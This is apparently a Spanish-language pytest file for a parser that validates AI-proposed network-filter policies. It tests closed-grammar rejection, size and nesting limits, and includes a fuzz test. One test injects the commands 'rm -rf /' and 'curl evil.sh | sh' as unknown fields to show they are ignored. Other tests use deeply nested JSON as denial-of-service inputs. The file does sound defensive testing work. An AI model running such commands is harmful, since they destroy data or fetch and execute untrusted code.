"""La gramatica cerrada. Regla 3: lo que no encaja se descarta sin interpretarse."""

from __future__ import annotations

import json
import random

import pytest

from guardia.politica import (
    FiltroRed,
    PropuestaInvalida,
    TipoPolitica,
    desde_dict,
    desde_json,
)


def _filtro(**cambios):
    base = {
        "id": "p-1",
        "tipo": "filtro_red",
        "descripcion": "corta el C2",
        "cuerpo": {
            "accion": "bloquear",
            "direccion": "salida",
            "puertos": [4444],
            "cidr": "203.0.113.0/24",
        },
    }
    base.update(cambios)
    return base


def test_propuesta_valida_se_parsea():
    propuesta = desde_dict(_filtro())

    assert propuesta.tipo is TipoPolitica.FILTRO_RED
    assert isinstance(propuesta.cuerpo, FiltroRed)
    assert propuesta.cuerpo.puertos == (4444,)


def test_los_campos_extra_se_ignoran_no_se_ejecutan():
    """Un campo que el modelo se invente no llega a ninguna parte: el parser solo
    lee las claves que conoce. No hay pasarela de "por si acaso lo necesito"."""
    crudo = _filtro()
    crudo["post_accion"] = "rm -rf /"
    crudo["cuerpo"]["comando"] = "curl evil.sh | sh"

    propuesta = desde_dict(crudo)

    assert not hasattr(propuesta, "post_accion")
    assert not hasattr(propuesta.cuerpo, "comando")


@pytest.mark.parametrize(
    "clave,valor",
    [
        ("tipo", "ejecutar_comando"),
        ("tipo", None),
        ("id", ""),
        ("id", 42),
        ("descripcion", None),
    ],
)
def test_campos_de_cabecera_invalidos(clave, valor):
    crudo = _filtro()
    crudo[clave] = valor

    with pytest.raises(PropuestaInvalida):
        desde_dict(crudo)


@pytest.mark.parametrize(
    "clave,valor",
    [
        ("accion", "ejecutar"),
        ("direccion", "lateral"),
        ("puertos", []),
        ("puertos", [0]),
        ("puertos", [65536]),
        ("puertos", ["22"]),
        ("puertos", [True]),
        ("cidr", "no soy un cidr"),
        ("cidr", "2001:db8::/32"),
    ],
)
def test_cuerpo_de_filtro_invalido(clave, valor):
    crudo = _filtro()
    crudo["cuerpo"][clave] = valor

    with pytest.raises(PropuestaInvalida):
        desde_dict(crudo)


def test_true_no_cuela_como_puerto():
    """bool es subclase de int en Python: sin la comprobacion explicita, True seria
    el puerto 1 y una propuesta absurda pasaria por buena."""
    crudo = _filtro()
    crudo["cuerpo"]["puertos"] = [True]

    with pytest.raises(PropuestaInvalida, match="puerto invalido"):
        desde_dict(crudo)


def test_json_que_no_es_objeto():
    with pytest.raises(PropuestaInvalida):
        desde_json('["esto", "es", "una", "lista"]')


def test_json_malformado():
    with pytest.raises(PropuestaInvalida, match="no es JSON valido"):
        desde_json("{ esto no cierra")


def test_texto_gigante_se_rechaza_antes_de_parsear():
    """Un contexto hostil puede mandar megas. No se parsea lo que no cabe."""
    with pytest.raises(PropuestaInvalida, match="tamano maximo"):
        desde_json("x" * 64_001)


def test_json_muy_anidado_se_descarta_no_revienta():
    """20000 corchetes son 40 KB: pasan el guardia de tamano, pero hacen que json.loads
    reviente la pila con RecursionError. Regla 3: eso se DESCARTA como PropuestaInvalida,
    no propaga fuera a colgar el plano de control — el que llama (triaje) solo ataja
    PropuestaInvalida. Salio de fuzzear la gramatica ('a ver si algo peta')."""
    hostil = "[" * 20_000 + "]" * 20_000
    assert len(hostil) < 64_000  # el crash estaba DESPUES del guardia de tamano
    with pytest.raises(PropuestaInvalida, match="anidado"):
        desde_json(hostil)


def test_anidado_profundo_bajo_el_limite_de_recursion_tambien_se_descarta():
    """El residual que quedo anotado al fuzzear: 500 niveles no revientan la pila, se
    parseaban enteros (CPU gratis para el atacante) y morian despues en desde_dict.
    El guardia de profundidad los corta antes de parsear."""
    hostil = "[" * 500 + "]" * 500
    with pytest.raises(PropuestaInvalida, match="anidado"):
        desde_json(hostil)


def test_corchetes_dentro_de_un_string_no_cuentan_como_profundidad():
    """El guardia cuenta estructura, no caracteres: una descripcion llena de corchetes,
    llaves y comillas escapadas es fea pero valida. Sin distinguir strings seria un
    falso positivo y el guardia rechazaria propuestas legitimas."""
    descripcion = "[" * 100 + ' {{{ comilla " y barra \\ ' + "]" * 100
    crudo = _filtro(descripcion=descripcion)

    assert desde_json(json.dumps(crudo)).descripcion == descripcion


def test_propiedad_de_frontera_toda_entrada_muere_bien():
    """La propiedad que el fuzzing dejo escrita: toda entrada produce Propuesta valida
    O PropuestaInvalida — cualquier otra excepcion es superficie de DoS, porque el que
    llama solo ataja PropuestaInvalida. Generador con semilla fija: determinista y sin
    dependencias. Suelo, no techo — mutacional a ciegas, no guiado por cobertura."""
    azar = random.Random(20260801)
    valido = json.dumps(_filtro())
    alfabeto = valido + '\\"[]{}:,0123456789.eE+-tfn \x00ñ‮'

    def mutado():
        s = list(valido)
        for _ in range(azar.randint(1, 8)):
            i = azar.randrange(len(s))
            op = azar.randrange(3)
            if op == 0 and len(s) > 1:
                del s[i]
            elif op == 1:
                s[i] = azar.choice(alfabeto)
            else:
                s.insert(i, azar.choice(alfabeto))
        return "".join(s)

    def ruido():
        return "".join(azar.choice(alfabeto) for _ in range(azar.randint(0, 300)))

    def anidado():
        abre = azar.choice(["[", "{", '{"a":['])
        cierra = {"[": "]", "{": "}", '{"a":[': "]}"}[abre]
        n = azar.randint(1, 3000)
        return abre * n + azar.choice(["", '"x"', "1"]) + cierra * azar.randint(0, n)

    generadores = (mutado, ruido, anidado)
    for caso in range(2000):
        entrada = azar.choice(generadores)()
        try:
            propuesta = desde_json(entrada)
        except PropuestaInvalida:
            continue
        except Exception as e:  # la fuga que este test caza: nada mas debe escaparse
            pytest.fail(
                f"caso {caso}: {type(e).__name__} se escapo de la frontera "
                f"con la entrada {entrada[:120]!r}"
            )
        assert propuesta.id  # si parseo, es una Propuesta formada, no basura


def test_descripcion_demasiado_larga():
    crudo = _filtro(descripcion="a" * 513)

    with pytest.raises(PropuestaInvalida, match="excede"):
        desde_dict(crudo)


def test_cidr_no_estricto_se_normaliza():
    """10.0.0.5/24 es lo que escribe un humano con prisa; se normaliza a la red."""
    crudo = _filtro()
    crudo["cuerpo"]["cidr"] = "10.0.0.5/24"

    propuesta = desde_dict(crudo)

    assert str(propuesta.cuerpo.cidr) == "10.0.0.0/24"


def test_origen_por_defecto_es_ia():
    """Si nadie dice de donde viene, se asume lo mas restrictivo."""
    assert desde_dict(_filtro()).origen == "ia"


def test_ida_y_vuelta_desde_json():
    propuesta = desde_json(json.dumps(_filtro()))

    assert propuesta.id == "p-1"
